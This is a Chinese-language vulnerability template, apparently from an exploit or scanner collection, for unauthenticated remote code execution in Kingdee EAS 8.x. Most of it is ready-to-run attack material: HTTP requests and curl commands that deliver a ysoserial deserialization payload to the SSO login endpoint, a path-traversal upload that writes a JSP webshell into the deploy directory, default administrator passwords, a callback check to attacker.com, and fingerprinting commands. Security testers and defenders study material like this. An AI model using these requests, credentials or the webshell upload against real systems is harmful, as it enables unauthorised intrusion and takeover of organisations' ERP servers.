---
id: KINGDEE-EAS-DESER
title: 金蝶EAS 反序列化/文件上传 RCE
product: kingdee
vendor: 金蝶软件
version_affected: "EAS 8.x"
severity: CRITICAL
tags: [rce, deserialization, file_upload, 国产, erp, 无需认证]
fingerprint: ["金蝶", "Kingdee", "EAS", "/easportal/", "/eassso/"]
---

## 漏洞描述

金蝶EAS系统存在反序列化漏洞，可未授权执行任意命令。

## 影响版本

- 金蝶EAS 8.x

## 前置条件

- 目标运行金蝶EAS 且可通过网络访问
- `/eassso/` 接口未做访问限制
- 无需认证

## 利用步骤

### 反序列化 RCE

```http
POST /eassso/rest/api/login HTTP/1.1
Host: target
Content-Type: application/json

{"loginType":"sso","userId":"admin","language":"zh_CN","dataCenter":"DefaultDataCenter","token":"<ysoserial_payload_base64>"}
```

### 任意文件上传

```http
POST /eassso/common/fileUpload.do HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="../../server/default/deploy/easportal.war/test.jsp"
Content-Type: application/octet-stream

<%out.print("test");%>
------WebKitFormBoundary--
```

### 默认凭据

- `admin` / `admin`
- `administrator` / `kdadmin`

## Payload

### 反序列化 RCE

```bash
# 使用 ysoserial 生成反序列化 payload 后 base64 编码
curl -X POST "http://target/eassso/rest/api/login" \
  -H "Content-Type: application/json" \
  -d '{"loginType":"sso","userId":"admin","language":"zh_CN","dataCenter":"DefaultDataCenter","token":"<ysoserial_payload_base64>"}'
```

### 任意文件上传（路径穿越写 webshell）

```bash
curl -X POST "http://target/eassso/common/fileUpload.do" \
  -F 'file=@-;filename=../../server/default/deploy/easportal.war/test.jsp;type=application/octet-stream' <<< '<%out.print("vuln_test");%>'
```

### 访问 webshell

```bash
curl -s "http://target/easportal/test.jsp"
```

## 验证方法

- 反序列化：使用 DNS/HTTP 回连 payload，attacker.com 收到请求即确认
- 文件上传：访问 `/easportal/test.jsp`，响应中包含 `vuln_test` 即确认文件上传成功

```bash
curl -s "http://target/easportal/test.jsp" | grep "vuln_test"
```

## 指纹确认

```bash
curl -s http://target/easportal/ | grep -i "kingdee\|金蝶\|EAS"
```
